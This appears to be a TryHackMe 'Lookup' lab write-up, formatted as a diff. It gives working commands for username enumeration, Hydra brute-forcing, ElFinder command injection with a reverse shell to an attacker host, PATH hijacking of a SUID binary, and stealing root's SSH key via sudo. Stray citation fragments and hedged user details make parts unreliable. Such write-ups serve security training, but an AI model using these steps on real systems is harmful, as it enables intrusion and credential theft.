@@ -1,0 +1,142 @@
+Platform: TryHackMe
+Room: Lookup (boot‑to‑root)
+Difficulty: Easy–Medium
+Date Completed: July 2025
+Author: William Steiner
+
+🚀 TL;DR
+Enumerated valid credentials via login form behavior differences → exploited ElFinder file manager for command injection → gained www-data shell → abused root-owned SUID binary pwm via PATH hijack to obtain user passwords → used look command via sudo to steal root’s SSH key → popped root shell.
+
+➤ 1. Reconnaissance 🧭
+bash
+Copy
+Edit
+nmap -sC -sV -p- <TARGET_IP>
+Findings:
+
+22/tcp – OpenSSH
+
+80/tcp – Apache 2.4.41 (Ubuntu) 
+X (formerly Twitter)
++12
+Medium
++12
+LinkedIn
++12
+Medium
+
+Accessing HTTP redirected to lookup.thm, so it was added to /etc/hosts.
+
+➤ 2. Web Enumeration & Username Discovery
+A login form at /login.php revealed subtle differences in error responses—some responses indicated an unknown username, others a wrong password. This behavior was ideal for automated username enumeration.
+
+🔧 Tools & Script:
+python
+Copy
+Edit
+import requests
+
+url = "http://lookup.thm/login.php"
+for name in open("usernames.txt"):
+    resp = requests.post(url, data={"username": name.strip(), "password": "test"})
+    if "Wrong password" in resp.text:
+        print("[+] Valid user:", name.strip())
+Once a valid username was found, Hydra was used to brute-force the password:
+
+bash
+Copy
+Edit
+hydra -l valid_user -P rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password"
+This process yielded working credentials. 
+YouTube
++7
+Medium
++7
+flarexes.com
++7
+
+➤ 3. Initial Foothold – ElFinder Vulnerability
+Successful authentication redirected to files.lookup.thm, hosting ElFinder v2.1.47—a known version vulnerable to PHP command injection. 
+LinkedIn
++3
+flarexes.com
++3
+Medium
++3
+
+Two exploitation paths:
+
+Using a Python/Exploit-DB script to upload a malicious “image” payload.
+
+Leveraging the Metasploit module: exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection.
+
+Metasploit option:
+
+bash
+Copy
+Edit
+msf6> set RHOSTS files.lookup.thm  
+msf6> set LHOST <ATTACKER_IP>  
+msf6> run  
+Gained a meterpreter shell, then upgraded to a proper bash -i reverse shell as www-data.
+
+➤ 4. User Enumeration & Privilege Escalation to mike (or think)
+Exploring /home, discovered a user directory (e.g. think) containing user.txt and .passwords. Access was blocked due to permissions.
+
+Enumeration revealed a root-owned SUID binary /usr/sbin/pwm which calls the id command without an absolute binary path. This opened the door to a PATH hijacking attack.
+
+bash
+Copy
+Edit
+cd /tmp
+echo -e '#!/bin/bash\necho "uid=33(think) gid=33(think) groups=(think)"' > id
+chmod +x id
+export PATH=/tmp:$PATH
+/usr/sbin/pwm
+pwm tricked into treating us as user think and returned the .passwords file. 
+YouTube
++7
+flarexes.com
++7
+Medium
++7
+
+With the password list in hand, think SSH login was achieved.
+
+bash
+Copy
+Edit
+ssh think@lookup.thm
+cat user.txt
+➤ 5. Root Access via look Command via sudo
+Running sudo -l under think showed only one permitted root command: look.
+
+Using GTFOBins knowledge, look can read text files. Thus, root files like /root/root.txt or /root/.ssh/id_rsa are accessible.
+
+bash
+Copy
+Edit
+sudo look '' /root/root.txt
+Or extract the private key:
+
+bash
+Copy
+Edit
+sudo look '' /root/.ssh/id_rsa > my_key
+chmod 600 my_key
+ssh -i my_key root@lookup.thm
+✨ Key Takeaways:
+Web login forms leaking subtle error differences are gold for username enumeration.
+
+Even a default file manager like ElFinder can expose RCE if not patched.
+
+Uncommon but custom SUID binaries deserve scrutiny—especially if they invoke external binaries via PATH.
+
+GTFOBins remains a powerful resource—look is underutilized.
+
+Tools Summary
+Phase	Tools/Techniques
+Recon	nmap, /etc/hosts editing
+User Enumeration	Python scripting, Hydra
+RCE Exploitation	ElFinder exploit (Metasploit or custom script)
+Privilege Esc	PATH Hijack, pwm, sudo, look, private key extraction
